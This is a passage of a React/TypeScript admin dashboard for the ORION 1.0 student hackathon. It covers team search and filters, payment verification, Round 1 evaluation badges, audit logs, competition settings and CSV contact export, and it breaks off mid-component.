      // revoking the object URL synchronously can abort an unstarted download).
      const blob = new Blob(['﻿' + csvContent], { type: 'text/csv;charset=utf-8;' });
      const url = URL.createObjectURL(blob);
      const link = document.createElement('a');
      link.setAttribute('href', url);
      link.setAttribute('download', `ORION_Hackathon_Contacts_${new Date().toISOString().split('T')[0]}.csv`);
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
      setTimeout(() => URL.revokeObjectURL(url), 60_000);

      showToast('success', 'Contacts Exported', `Downloaded ${totalPeople} contact${totalPeople === 1 ? '' : 's'} across ${teams.length} team${teams.length === 1 ? '' : 's'} as CSV.`);
    } catch (err) {
      console.error('[Admin] Contacts CSV export failed:', err);
      showToast('error', 'Export Failed', err instanceof Error ? err.message : 'Could not build the contacts CSV file.');
    }
  };

  // Filtered Teams
  const filteredTeams = teams.filter((t) => {
    const q = searchQuery.toLowerCase().trim();
    const matchesSearch = !q || (
      t.registration_id.toLowerCase().includes(q) ||
      t.team_name.toLowerCase().includes(q) ||
      t.leader_name.toLowerCase().includes(q) ||
      t.leader_email.toLowerCase().includes(q) ||
      t.leader_phone.includes(q) ||
      (t.payment?.utr_number && t.payment.utr_number.toLowerCase().includes(q)) ||
      t.institution.toLowerCase().includes(q)
    );

    const matchesTrack = selectedTrack === 'ALL' || t.problem_statement.includes(selectedTrack);
    const matchesPayment = selectedPaymentStatus === 'ALL' || t.payment_status === selectedPaymentStatus;
    const matchesRound = selectedRoundStatus === 'ALL' || t.round_1_status === selectedRoundStatus;
    const matchesSuspicious = !onlySuspicious || ((t.suspicion_flags?.length || 0) > 0);

    const matchesRating = 
      selectedRatingFilter === 'ALL' ||
      (selectedRatingFilter === 'RATED' && t.round_1_score !== null && t.round_1_score !== undefined) ||
      (selectedRatingFilter === 'UNRATED' && (t.round_1_score === null || t.round_1_score === undefined)) ||
      (selectedRatingFilter === 'TOP_CONTENDER' && (t.round_1_score || 0) >= 40) ||
      (selectedRatingFilter === 'BORDERLINE' && (t.round_1_score || 0) >= 30 && (t.round_1_score || 0) < 40) ||
      (selectedRatingFilter === 'BELOW_CUTOFF' && t.round_1_score !== null && t.round_1_score !== undefined && (t.round_1_score || 0) < 30);

    return matchesSearch && matchesTrack && matchesPayment && matchesRound && matchesSuspicious && matchesRating;
  });

  return (
    <div className="min-h-screen bg-[#020617] text-slate-100 selection:bg-[#00BCF2]/30 selection:text-[#BAE6FD] relative pb-20">
      
      {/* Top Header */}
      <header className="relative z-20 border-b border-white/10 bg-[#0B1220]/90 backdrop-blur-xl sticky top-0">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 py-3 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <Link href="/" className="flex items-center gap-2 group">
              <Image src="/orion-logo-v1.webp" alt="ORION 1.0" width={512} height={512} sizes="32px" className="w-8 h-8 object-contain" />
              <div>
                <div className="flex items-center gap-1.5">
                  <span className="font-display font-black text-sm text-white">ORION 1.0</span>
                  <span className="text-[9px] font-mono bg-rose-500/20 text-rose-300 px-1.5 py-0.2 border border-rose-500/40 font-bold">
                    ADMIN COMMAND CENTER
                  </span>
                </div>
                <div className="text-[9px] font-sans text-slate-400">Microsoft Club SIST</div>
              </div>
            </Link>
          </div>

          <div className="flex items-center gap-3">
            {isAuthenticated ? (
              <>
                <button
                  onClick={() => { fetchAdminData(); }}
                  className="p-2 bg-[#040E24] border border-white/10 text-[#38BDF8] hover:bg-[#07193D] transition-colors text-xs font-mono flex items-center gap-1.5 cursor-pointer"
                  title="Sync Live Records"
                >
                  <RefreshCw className="w-3.5 h-3.5" />
                  <span className="hidden sm:inline text-[10px]">SYNC</span>
                </button>

                <button
                  onClick={handleExportCSV}
                  className="px-3 py-1.5 bg-[#0B2556] border border-[#38BDF8]/40 text-[#38BDF8] hover:bg-[#38BDF8]/20 transition-colors text-xs font-mono-hud flex items-center gap-1.5 cursor-pointer"
                >
                  <Download className="w-3.5 h-3.5" />
                  <span className="hidden sm:inline">EXPORT CSV</span>
                </button>

                <button
                  onClick={handleExportContactsCSV}
                  className="px-3 py-1.5 bg-[#0B2556] border border-[#38BDF8]/40 text-[#38BDF8] hover:bg-[#38BDF8]/20 transition-colors text-xs font-mono-hud flex items-center gap-1.5 cursor-pointer"
                  title="Download every leader & member name + phone number, one row per person, with their team"
                >
                  <Phone className="w-3.5 h-3.5" />
                  <span className="hidden sm:inline">EXPORT CONTACTS</span>
                </button>

                <button
                  onClick={async () => {
                    sound.playClick();
                    await handleAdminAction({
                      action: 'DISPATCH_PAYMENT_REMINDERS',
                      teamId: 'ALL'
                    });
                  }}
                  className="px-3 py-1.5 bg-[#1B1904] border border-amber-500/50 text-amber-300 hover:bg-amber-950/70 transition-colors text-xs font-mono-hud flex items-center gap-1.5 cursor-pointer"
                  title="Scan & send payment reminders to squads unpaid for >5 minutes"
                >
                  <Mail className="w-3.5 h-3.5 text-amber-400" />
                  <span className="hidden sm:inline">UNPAID REMINDERS (&gt;5m)</span>
                </button>

                <button
                  onClick={handleCheckMailer}
                  disabled={isCheckingMailer}
                  className="px-3 py-1.5 bg-[#061838] border border-[#38BDF8]/40 text-[#38BDF8] hover:bg-[#0C2A5E] transition-colors text-xs font-mono-hud flex items-center gap-1.5 cursor-pointer disabled:opacity-50"
                  title="Verify SMTP connection & credentials without sending anything"
                >
                  {isCheckingMailer ? <RefreshCw className="w-3.5 h-3.5 animate-spin" /> : <CheckCircle2 className="w-3.5 h-3.5" />}
                  <span className="hidden sm:inline">TEST MAILER</span>
                </button>

                <button
                  onClick={handleLogout}
                  className="px-3 py-1.5 bg-rose-950/40 border border-rose-500/40 text-rose-300 hover:bg-rose-900/60 transition-colors text-xs font-mono-hud flex items-center gap-1.5 cursor-pointer"
                >
                  <LogOut className="w-3.5 h-3.5" />
                  <span>EXIT</span>
                </button>
              </>
            ) : (
              <Link
                href="/"
                className="px-3.5 py-1.5 border border-white/15 text-slate-300 hover:text-white font-mono-hud text-xs flex items-center gap-1.5 transition-colors"
              >
                <ArrowLeft className="w-3.5 h-3.5" />
                <span>BACK TO EVENT SITE</span>
              </Link>
            )}
          </div>
        </div>
      </header>

      {/* Main Content Area */}
      <main className="relative z-10 max-w-7xl mx-auto px-4 sm:px-6 pt-6">
        
        {/* LOGIN FORM */}
        {!isAuthenticated ? (
          <div className="max-w-md mx-auto pt-16">
            <div className="p-6 sm:p-8 bg-[#07193D] border border-[#38BDF8]/40 shadow-2xl space-y-5 text-left">
              <div className="flex items-center gap-3 border-b border-white/10 pb-4">
                <div className="p-2.5 bg-[#0B2556] border border-[#38BDF8]/40 text-[#38BDF8]">
                  <ShieldCheck className="w-6 h-6" />
                </div>
                <div>
                  <div className="text-[10px] font-mono-hud text-[#38BDF8] font-bold uppercase tracking-wider">
                    RESTRICTED SECRETARIAT ACCESS
                  </div>
                  <h2 className="text-xl font-display font-black text-white">
                    ADMIN COMMAND GATE
                  </h2>
                </div>
              </div>

              {authError && (
                <div className="p-3 bg-rose-950/60 border border-rose-500/50 text-rose-200 text-xs font-mono">
                  {authError}
                </div>
              )}

              <form onSubmit={handleLogin} className="space-y-4">
                <div>
                  <label className="block text-[11px] font-mono-hud text-[#BAE6FD] mb-1">
                    ADMIN / MARSHAL SECURITY PASSCODE
                  </label>
                  <input
                    type="password"
                    required
                    value={passcode}
                    onChange={(e) => setPasscode(e.target.value)}
                    placeholder="Enter admin or marshal key"
                    className="w-full px-3.5 py-2.5 bg-[#040E24] border border-[#38BDF8]/40 text-white text-xs font-mono focus:outline-none"
                  />
                </div>

                <button
                  type="submit"
                  disabled={isLoading}
                  className="btn-glow-cyan w-full py-3 font-display font-black text-xs text-[#040E24] bg-gradient-to-r from-[#FFFFFF] via-[#BAE6FD] to-[#38BDF8] flex items-center justify-center gap-2 cursor-pointer active:scale-95 shadow-xl disabled:opacity-50"
                >
                  <Unlock className="w-4 h-4 text-[#040E24]" />
                  <span>AUTHORIZE ADMIN SESSION</span>
                </button>
              </form>
            </div>
          </div>
        ) : (
          <div className="space-y-6">
            
            {/* LIVE METRICS HUD */}
            <div className="grid grid-cols-2 sm:grid-cols-4 lg:grid-cols-9 gap-2.5">
              <div className="p-3 bg-[#07193D] border border-white/10">
                <div className="text-[9px] font-mono-hud text-slate-400">TOTAL SQUADS</div>
                <div className="text-xl font-mono-hud font-black text-white">{stats.totalRegistrations}</div>
              </div>
              <div className="p-3 bg-[#07193D] border border-emerald-500/40">
                <div className="text-[9px] font-mono-hud text-emerald-400">PAID & VERIFIED</div>
                <div className="text-xl font-mono-hud font-black text-emerald-400">{stats.paymentVerified}</div>
              </div>
              <div className="p-3 bg-[#07193D] border border-amber-500/40">
                <div className="text-[9px] font-mono-hud text-amber-300">PAY PENDING</div>
                <div className="text-xl font-mono-hud font-black text-amber-300">{stats.paymentPending}</div>
              </div>
              <div className="p-3 bg-[#07193D] border border-orange-500/40">
                <div className="text-[9px] font-mono-hud text-orange-400">RESUBMIT REQ</div>
                <div className="text-xl font-mono-hud font-black text-orange-400">{stats.paymentResubmission}</div>
              </div>
              <div className="p-3 bg-[#07193D] border border-[#38BDF8]/40">
                <div className="text-[9px] font-mono-hud text-[#38BDF8]">R1 PPT FILED</div>
                <div className="text-xl font-mono-hud font-black text-[#38BDF8]">{stats.round1Submissions}</div>
              </div>
              <div className="p-3 bg-[#07193D] border border-cyan-500/40">
                <div className="text-[9px] font-mono-hud text-cyan-300">R1 IN REVIEW</div>
                <div className="text-xl font-mono-hud font-black text-cyan-300">{stats.round1PendingReview}</div>
              </div>
              <div className="p-3 bg-[#07193D] border border-emerald-400/60 shadow-[0_0_10px_rgba(52,211,153,0.2)]">
                <div className="text-[9px] font-mono-hud text-emerald-300 font-bold">R2 SELECTED</div>
                <div className="text-xl font-mono-hud font-black text-emerald-300">{stats.round1Selected}</div>
              </div>
              <div className="p-3 bg-[#07193D] border border-slate-500/40">
                <div className="text-[9px] font-mono-hud text-slate-400">NOT SELECTED</div>
                <div className="text-xl font-mono-hud font-black text-slate-400">{stats.round1NotSelected}</div>
              </div>
              <div className={`p-3 bg-[#07193D] border ${
                stats.reuploadRequestsPending > 0
                  ? 'border-amber-400/70 shadow-[0_0_10px_rgba(245,158,11,0.25)]'
                  : 'border-white/10'
              }`}>
                <div className="text-[9px] font-mono-hud text-amber-300">RE-UPLOAD REQ</div>
                <div className={`text-xl font-mono-hud font-black ${
                  stats.reuploadRequestsPending > 0 ? 'text-amber-300 animate-pulse' : 'text-slate-500'
                }`}>
                  {stats.reuploadRequestsPending}
                </div>
              </div>
            </div>

            {/* NAVIGATION TABS */}
            <div className="flex flex-wrap items-center gap-2 border-b border-white/10 pb-2">
              <button
                onClick={() => setActiveTab('TEAMS')}
                className={`px-4 py-2 text-xs font-mono-hud font-bold border transition-all cursor-pointer ${
                  activeTab === 'TEAMS'
                    ? 'bg-[#38BDF8]/20 border-[#38BDF8] text-white shadow-[0_0_10px_rgba(56,189,248,0.3)]'
                    : 'bg-[#040E24] border-white/10 text-slate-400 hover:text-white'
                }`}
              >
                SQUAD ROSTER & EVALUATION ({teams.length})
              </button>

              <button
                onClick={() => setActiveTab('CREDENTIALS')}
                className={`px-4 py-2 text-xs font-mono-hud font-bold border transition-all cursor-pointer ${
                  activeTab === 'CREDENTIALS'
                    ? 'bg-[#38BDF8]/20 border-[#38BDF8] text-white shadow-[0_0_10px_rgba(56,189,248,0.3)]'
                    : 'bg-[#040E24] border-white/10 text-slate-400 hover:text-white'
                }`}
              >
                TEAM CREDENTIALS
              </button>

              <button
                onClick={() => setActiveTab('AUDIT_LOGS')}
                className={`px-4 py-2 text-xs font-mono-hud font-bold border transition-all cursor-pointer ${
                  activeTab === 'AUDIT_LOGS'
                    ? 'bg-[#38BDF8]/20 border-[#38BDF8] text-white shadow-[0_0_10px_rgba(56,189,248,0.3)]'
                    : 'bg-[#040E24] border-white/10 text-slate-400 hover:text-white'
                }`}
              >
                SYSTEM AUDIT LOGS ({auditLogs.length})
              </button>

              <button
                onClick={() => setActiveTab('SETTINGS')}
                className={`px-4 py-2 text-xs font-mono-hud font-bold border transition-all cursor-pointer ${
                  activeTab === 'SETTINGS'
                    ? 'bg-[#38BDF8]/20 border-[#38BDF8] text-white shadow-[0_0_10px_rgba(56,189,248,0.3)]'
                    : 'bg-[#040E24] border-white/10 text-slate-400 hover:text-white'
                }`}
              >
                COMPETITION SETTINGS
              </button>
            </div>

            {/* TAB 1: TEAMS & EVALUATION */}
            {activeTab === 'TEAMS' && (
              <div className="space-y-4">
                
                {/* Search & Multi-Filter Bar */}
                <div className="p-4 bg-[#07193D] border border-white/10 space-y-3">
                  <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-6 gap-2.5">
                    
                    {/* Text Search */}
                    <div className="lg:col-span-2 relative">
                      <Search className="w-3.5 h-3.5 absolute left-3 top-3 text-slate-400" />
                      <input
                        type="text"
                        value={searchQuery}
                        onChange={(e) => setSearchQuery(e.target.value)}
                        placeholder="Search Team ID, Squad Name, Leader, Email, Phone, UTR..."
                        className="w-full pl-9 pr-3 py-2 bg-[#040E24] border border-white/10 text-white text-xs font-mono focus:border-[#38BDF8] focus:outline-none"
                      />
                    </div>

                    {/* Payment Filter */}
                    <div>
                      <select
                        value={selectedPaymentStatus}
                        onChange={(e) => setSelectedPaymentStatus(e.target.value)}
                        className="w-full px-3 py-2 bg-[#040E24] border border-white/10 text-white text-xs font-mono focus:border-[#38BDF8] focus:outline-none cursor-pointer"
                      >
                        <option value="ALL">Payment: All</option>
                        <option value="VERIFIED">Verified</option>
                        <option value="PENDING">Pending Review</option>
                        <option value="RESUBMISSION_REQUIRED">Resubmit Req</option>
                        <option value="REJECTED">Rejected</option>
                        <option value="NOT_SUBMITTED">Not Submitted</option>
                      </select>
                    </div>

                    {/* Round 1 Status Filter */}
                    <div>
                      <select
                        value={selectedRoundStatus}
                        onChange={(e) => setSelectedRoundStatus(e.target.value)}
                        className="w-full px-3 py-2 bg-[#040E24] border border-white/10 text-white text-xs font-mono focus:border-[#38BDF8] focus:outline-none cursor-pointer"
                      >
                        <option value="ALL">R1 Status: All</option>
                        <option value="SUBMISSION_OPEN">Open</option>
                        <option value="SUBMITTED">PPT Submitted</option>
                        <option value="UNDER_REVIEW">In Review</option>
                        <option value="SELECTED">Selected for R2</option>
                        <option value="NOT_SELECTED">Not Selected</option>
                        <option value="NOT_STARTED">Not Started</option>
                      </select>
                    </div>

                    {/* Rubric Rating Filter */}
                    <div>
                      <select
                        value={selectedRatingFilter}
                        onChange={(e) => setSelectedRatingFilter(e.target.value)}
                        className="w-full px-3 py-2 bg-[#040E24] border border-white/10 text-white text-xs font-mono focus:border-[#38BDF8] focus:outline-none cursor-pointer"
                      >
                        <option value="ALL">Rubric: All Ratings</option>
                        <option value="RATED">Evaluated Only</option>
                        <option value="TOP_CONTENDER">Top Contenders (≥40/50)</option>
                        <option value="BORDERLINE">Borderline (30-39/50)</option>
                        <option value="BELOW_CUTOFF">Below Cutoff (&lt;30/50)</option>
                        <option value="UNRATED">Unrated</option>
                      </select>
                    </div>

                    {/* Track Filter */}
                    <div>
                      <select
                        value={selectedTrack}
                        onChange={(e) => setSelectedTrack(e.target.value)}
                        className="w-full px-3 py-2 bg-[#040E24] border border-white/10 text-white text-xs font-mono focus:border-[#38BDF8] focus:outline-none cursor-pointer"
                      >
                        <option value="ALL">Track: All</option>
                        <option value="PS-01">PS-01: FloatChat</option>
                        <option value="PS-02">PS-02: LexVault</option>
                        <option value="PS-03">PS-03: SylvaSense</option>
                        <option value="PS-04">PS-04: Open Track</option>
                      </select>
                    </div>

                  </div>

                  {/* Suspicious Checkbox Toggle */}
                  <div className="flex items-center justify-between text-xs font-mono pt-1">
                    <label className="flex items-center gap-2 cursor-pointer text-amber-300">
                      <input
                        type="checkbox"
                        checked={onlySuspicious}
                        onChange={(e) => setOnlySuspicious(e.target.checked)}
                        className="accent-amber-400 w-3.5 h-3.5"
                      />
                      <span>Show Only Flagged / Duplicate Anomalies</span>
                    </label>
                    <span className="text-slate-400">
                      Showing {filteredTeams.length} of {teams.length} Squads
                    </span>
                  </div>
                </div>

                {/* Team Roster Grid */}
                <div className="space-y-2">
                  {filteredTeams.length === 0 ? (
                    <div className="p-8 bg-[#07193D] border border-white/10 text-center text-slate-400 text-xs font-mono">
                      No matching squad records found.
                    </div>
                  ) : (
                    filteredTeams.map((team) => {
                      const latestSub = activeSubmission(team);
                      return (
                        <div 
                          key={team.id}
                          onClick={() => handleSelectTeam(team)}
                          className={`p-4 bg-[#07193D] hover:bg-[#0B2556] border transition-all cursor-pointer flex flex-col md:flex-row md:items-center justify-between gap-3 ${
                            team.round_1_status === 'SELECTED'
                              ? 'border-emerald-400/60 shadow-[0_0_10px_rgba(52,211,153,0.15)]'
                              : (team.suspicion_flags?.length || 0) > 0
                              ? 'border-amber-400/60'
                              : 'border-white/10 hover:border-[#38BDF8]/40'
                          }`}
                        >
                          <div className="space-y-1">
                            <div className="flex items-center gap-2 flex-wrap">
                              <span className="font-mono-hud text-xs font-bold text-[#38BDF8]">
                                {team.registration_id}
                              </span>
                              <span className="font-display font-black text-sm text-white">
                                {team.team_name}
                              </span>
                              {(team.suspicion_flags?.length || 0) > 0 && (
                                <span className="text-[9px] font-mono bg-amber-950 text-amber-300 px-1.5 py-0.2 border border-amber-400/40 font-bold flex items-center gap-1">
                                  <AlertTriangle className="w-2.5 h-2.5" />
                                  {team.suspicion_flags?.length} FLAG(S)
                                </span>
                              )}

                              {/* Rubric Score Badge */}
                              {team.round_1_score !== null && team.round_1_score !== undefined ? (
                                <span className="text-[10px] font-mono px-2 py-0.5 font-bold bg-[#040E24] text-[#38BDF8] border border-[#38BDF8]/40 flex items-center gap-1">
                                  <Star className="w-2.5 h-2.5 fill-[#38BDF8]" />
                                  <span>{team.round_1_score}/50 ({Math.round((Number(team.round_1_score) / 50) * 100)}%)</span>
                                </span>
                              ) : (
                                <span className="text-[9px] font-mono px-1.5 py-0.2 text-slate-500 bg-[#020817] border border-white/5">
                                  Unrated
                                </span>
                              )}

                              {/* Direct PPT download badge */}
                              {latestSub && (
                                <a
                                  href={latestSub.file_url}
                                  target="_blank"
                                  rel="noreferrer"
                                  onClick={(e) => e.stopPropagation()}
                                  className="text-[10px] font-mono bg-[#0B2556] hover:bg-[#133A80] text-cyan-300 px-2 py-0.5 border border-[#38BDF8]/40 flex items-center gap-1 transition-colors"
                                  title={`Download ${latestSub.original_filename}`}
                                >
                                  <FileText className="w-3 h-3 text-[#38BDF8]" />
                                  <span>PPT (v{latestSub.version})</span>
                                </a>
                              )}

                              {/* Direct Project Link badge */}
                              {latestSub?.project_url && (
                                <a
                                  href={latestSub.project_url.startsWith('http') ? latestSub.project_url : `https://${latestSub.project_url}`}
                                  target="_blank"
                                  rel="noreferrer"
                                  onClick={(e) => e.stopPropagation()}
                                  className="text-[10px] font-mono bg-cyan-950/70 hover:bg-cyan-900 text-cyan-200 px-2 py-0.5 border border-cyan-400/40 flex items-center gap-1 transition-colors"
                                  title={`Open Project Link: ${latestSub.project_url}`}
                                >
                                  <Globe className="w-3 h-3 text-cyan-400" />
                                  <span>Project Link</span>
                                  <ExternalLink className="w-2.5 h-2.5" />
                                </a>
                              )}
                            </div>
                            <div className="text-xs text-slate-300 font-sans flex flex-wrap items-center gap-x-3 gap-y-0.5">
                              <span>Leader: <strong>{team.leader_name}</strong> ({team.leader_phone})</span>
                              <span>•</span>
                              <span className="text-slate-400 truncate max-w-xs">{team.institution}</span>
                              <span>•</span>
                              <span className="text-[#38BDF8] font-mono">{team.problem_statement}</span>
                            </div>
                          </div>

                          <div className="flex items-center gap-2 shrink-0 flex-wrap">
                            {/* Payment Badge */}
                            <span className={`text-[10px] font-mono px-2 py-0.5 font-bold ${
                              team.payment_status === 'VERIFIED'
                                ? 'bg-emerald-950 text-emerald-300 border border-emerald-500/30'
                                : team.payment_status === 'PENDING'
                                ? 'bg-amber-950 text-amber-300 border border-amber-500/30'
                                : 'bg-rose-950 text-rose-300 border border-rose-500/30'
                            }`}>
                              PAY: {team.payment_status}
                            </span>

                            {/* Round 1 Status Badge */}
                            <span className={`text-[10px] font-mono px-2 py-0.5 font-bold ${
                              team.round_1_status === 'SELECTED'
                                ? 'bg-emerald-400 text-[#040E24]'
                                : ['SUBMITTED', 'UNDER_REVIEW'].includes(team.round_1_status)
                                ? 'bg-emerald-950 text-emerald-300 border border-emerald-500/30'
                                : 'bg-[#040E24] text-slate-400 border border-white/10'
                            }`}>
                              R1: {team.round_1_status}
                            </span>

                            {/* Pending re-upload request — surfaced in the roster
                                so organisers do not have to open every drawer. */}
                            {(team.resubmission_requests || []).some(r => r.status === 'PENDING') && (
                              <span className="text-[10px] font-mono px-2 py-0.5 font-bold bg-amber-400 text-[#040E24] animate-pulse">
                                RE-UPLOAD REQ
                              </span>
                            )}

                            {(team.resubmission_requests || []).some(r => r.status === 'APPROVED') && (
                              <span className="text-[10px] font-mono px-2 py-0.5 font-bold bg-emerald-950 text-emerald-300 border border-emerald-500/30">
                                RE-UPLOAD OK
                              </span>
                            )}

                            <button
                              type="button"
                              className="px-3 py-1.5 bg-[#0B2556] border border-[#38BDF8]/40 text-[#38BDF8] text-[11px] font-mono flex items-center gap-1 cursor-pointer"
                            >
                              <Eye className="w-3 h-3" />
                              <span>EVALUATE</span>
                            </button>
                          </div>
                        </div>
                      );
                    })
                  )}
                </div>
              </div>
            )}

            {activeTab === 'CREDENTIALS' && (
              <CredentialsPanel onUnauthorized={handleCredentialSessionExpired} />
            )}

            {/* TAB 2: AUDIT LOGS */}
            {activeTab === 'AUDIT_LOGS' && (
              <div className="p-5 bg-[#07193D] border border-white/10 space-y-3">
                <div className="text-xs font-mono-hud text-[#38BDF8] font-bold flex items-center gap-2 border-b border-white/10 pb-3">
                  <ListOrdered className="w-4 h-4" />
                  <span>IMMUTABLE ADMINISTRATIVE & SYSTEM AUDIT LOGS</span>
                </div>

                <div className="space-y-2 max-h-[70vh] overflow-y-auto">
                  {auditLogs.map((log) => (
                    <div key={log.id} className="p-3 bg-[#040E24] border border-white/5 text-xs font-mono flex items-start justify-between gap-3">
                      <div>
                        <div className="flex items-center gap-2">
                          <strong className="text-white">{log.action}</strong>
                          {log.team_name && <span className="text-[#38BDF8]">[{log.team_name}]</span>}
                          <span className="text-[10px] text-slate-400">by {log.actor}</span>
                        </div>
                        {log.details && <div className="text-slate-300 text-[11px] mt-0.5">{log.details}</div>}
                      </div>
                      <div className="text-[10px] text-slate-500 shrink-0">
                        {new Date(log.created_at).toLocaleString()}
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            )}

            {/* TAB 3: SETTINGS */}
            {activeTab === 'SETTINGS' && (
              <div className="p-6 bg-[#07193D] border border-white/10 space-y-5 max-w-2xl text-xs font-mono">
                <div className="text-xs font-mono-hud text-[#38BDF8] font-bold flex items-center gap-2 border-b border-white/10 pb-3">
                  <Settings className="w-4 h-4" />
                  <span>COMPETITION RULES & TIMING CONFIGURATION</span>
                </div>

                <form onSubmit={handleSaveSettings} className="space-y-4">
                  <div>
                    <label className="block text-slate-300 mb-1">Round 1 Submission Deadline (ISO String)</label>
                    <input
                      type="text"
                      value={settingsForm.round1SubmissionDeadline || ''}
                      onChange={(e) => setSettingsForm({ ...settingsForm, round1SubmissionDeadline: e.target.value })}
                      className="w-full p-2.5 bg-[#040E24] border border-white/10 text-white text-xs font-mono"
                    />
                  </div>

                  <div>
                    <label className="block text-slate-300 mb-1">Max Submission File Size (MB)</label>
                    <input
                      type="number"
                      value={settingsForm.maxFileSizeMb || 10}
                      onChange={(e) => setSettingsForm({ ...settingsForm, maxFileSizeMb: Number(e.target.value) })}
                      min="1"
                      max="100"
                      className="w-full p-2.5 bg-[#040E24] border border-white/10 text-white text-xs font-mono"
                    />
                  </div>

                  <div className="flex items-center gap-3">
                    <input
                      type="checkbox"
                      id="allowResubmission"
                      checked={settingsForm.allowRound1Resubmission || false}
                      onChange={(e) => setSettingsForm({ ...settingsForm, allowRound1Resubmission: e.target.checked })}
                      className="accent-[#38BDF8] w-4 h-4"
                    />
                    <label htmlFor="allowResubmission" className="text-slate-200 cursor-pointer">
                      Allow Round 1 Presentation Resubmission before deadline
                    </label>
                  </div>

                  <div>
                    <label className="block text-slate-300 mb-1">Organizer UPI ID</label>
                    <input
                      type="text"
                      value={settingsForm.upiId || ''}
                      onChange={(e) => setSettingsForm({ ...settingsForm, upiId: e.target.value })}
                      className="w-full p-2.5 bg-[#040E24] border border-white/10 text-white text-xs font-mono"
                    />
                  </div>

                  <button
                    type="submit"
                    disabled={isSavingSettings}
                    className="btn-glow-cyan px-6 py-2.5 font-display font-bold text-xs text-[#040E24] bg-gradient-to-r from-[#FFFFFF] via-[#BAE6FD] to-[#38BDF8] flex items-center gap-2 cursor-pointer active:scale-95"
                  >
                    {isSavingSettings ? 'SAVING...' : 'SAVE CONFIGURATION'}
                  </button>
                </form>
              </div>
            )}

          </div>
        )}

      </main>

      {/* TEAM DETAIL MODAL / DRAWER */}
      {selectedTeam && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/85 backdrop-blur-md animate-in fade-in duration-200">
          <div className="relative w-full max-w-4xl max-h-[92vh] overflow-y-auto bg-[#07193D] border border-[#38BDF8]/60 p-6 shadow-2xl space-y-5 text-left">
            
            {/* Header */}
            <div className="flex items-center justify-between border-b border-white/10 pb-4">
              <div>
                <div className="flex items-center gap-2">
                  <span className="font-mono-hud text-xs font-bold text-[#38BDF8]">{selectedTeam.registration_id}</span>
                  <span className="text-[10px] font-mono bg-[#0B2556] text-[#BAE6FD] px-2 py-0.5 border border-[#38BDF8]/30">
                    PASSCODE: {selectedTeam.access_token}
                  </span>
                </div>
                <h2 className="text-2xl font-display font-black text-white mt-1">
                  {selectedTeam.team_name}
                </h2>
                <div className="text-xs text-slate-300 font-sans mt-0.5">
                  {selectedTeam.institution} • Track: <strong>{selectedTeam.problem_statement}</strong>
                </div>
              </div>

              <button
                onClick={() => handleSelectTeam(null)}
                className="p-2 bg-[#040E24] border border-white/10 text-slate-300 hover:text-white cursor-pointer"
              >
                <XCircle className="w-5 h-5" />
              </button>
            </div>

            {/* Success Alert inside Modal */}
            {actionSuccessMsg && (
              <div className="p-3 bg-emerald-950/80 border border-emerald-400 text-emerald-200 text-xs font-mono flex items-center gap-2">
                <CheckCircle2 className="w-4 h-4 text-emerald-400" />
                <span>{actionSuccessMsg}</span>
              </div>
            )}

            {/* Suspicion Flags Alert (If Any) */}
            {(selectedTeam.suspicion_flags?.length || 0) > 0 && (
              <div className="p-4 bg-amber-950/60 border border-amber-500/60 space-y-2 text-xs font-mono">
                <div className="flex items-center gap-2 text-amber-300 font-bold">
                  <AlertTriangle className="w-4 h-4" />
                  <span>SUSPICIOUS REGISTRATION ANOMALIES DETECTED ({selectedTeam.suspicion_flags?.length})</span>
                </div>
                <div className="space-y-1.5">
                  {selectedTeam.suspicion_flags?.map((flag, idx) => (
                    <div key={idx} className="p-2 bg-black/40 border border-amber-500/20 text-amber-200 text-[11px]">
                      • [{flag.flag_type}] {flag.description}
                    </div>
                  ))}
                </div>
              </div>
            )}

            {/* Grid 2-Column: Actions & Details */}
            <div className="grid grid-cols-1 md:grid-cols-2 gap-5 text-xs font-mono">
              
              {/* PAYMENT VERIFICATION DOSSIER */}
              <div className="p-4 bg-[#040E24] border border-white/10 space-y-3">
                <div className="text-[11px] font-mono-hud text-[#38BDF8] font-bold border-b border-white/10 pb-2">
                  PAYMENT VERIFICATION (₹100)
                </div>

                <div className="space-y-1.5">
                  <div>Status: <strong className="text-white">{selectedTeam.payment_status}</strong></div>
                  <div>UTR / Ref: <strong className="text-[#38BDF8] font-mono">{selectedTeam.payment?.utr_number || 'NOT_SUBMITTED'}</strong></div>
                  <div>Payer Name: <span className="text-slate-300">{selectedTeam.payment?.payer_name || 'N/A'}</span></div>
                  <div>Payer UPI ID: <span className="text-[#38BDF8] font-mono">{selectedTeam.payment?.payer_upi || 'NOT_SUBMITTED'}</span></div>
                  <div>Submitted: <span className="text-slate-400">{selectedTeam.payment?.submitted_at ? new Date(selectedTeam.payment.submitted_at).toLocaleString() : 'N/A'}</span></div>
                  {selectedTeam.payment?.screenshot_url ? (
                    <div className="pt-1.5 pb-0.5">
                      {/* A button, not <a href> — receipts stored as data: URLs
                          are blocked from top-frame navigation by browsers. */}
                      <button
                        type="button"
                        onClick={() => openReceiptScreenshot(selectedTeam.payment!.screenshot_url!, selectedTeam.registration_id)}
                        className="inline-flex items-center gap-1.5 px-3 py-1.5 bg-[#0B2556] border border-[#38BDF8]/50 text-[#38BDF8] hover:bg-[#133A80] text-xs font-mono transition-colors cursor-pointer"
                      >
                        <ExternalLink className="w-3.5 h-3.5" />
                        <span>INSPECT RECEIPT SCREENSHOT</span>
                      </button>
                    </div>
                  ) : (
                    <div className="text-[11px] text-amber-400 font-mono italic pt-1">
                      ⚠️ No screenshot proof attached
                    </div>
                  )}
                </div>

                {/* Payment Action Buttons */}
                <div className="pt-2 border-t border-white/10 space-y-2">
                  <div className="flex gap-2">
                    <button
                      type="button"
                      disabled={activeActionKey !== null}
                      onClick={() => handleAdminAction({ action: 'VERIFY_PAYMENT', teamId: selectedTeam.registration_id })}
                      className="flex-1 py-2 bg-emerald-950 hover:bg-emerald-900 border border-emerald-500/50 text-emerald-300 font-bold text-xs flex items-center justify-center gap-1.5 cursor-pointer disabled:opacity-50 transition-colors"
                    >
                      {activeActionKey === `${selectedTeam.registration_id}-VERIFY_PAYMENT-` ? (
                        <RefreshCw className="w-3.5 h-3.5 animate-spin text-emerald-400" />
                      ) : (
                        <Check className="w-3.5 h-3.5" />
                      )}
                      <span>VERIFY PAYMENT</span>
                    </button>
                    <button
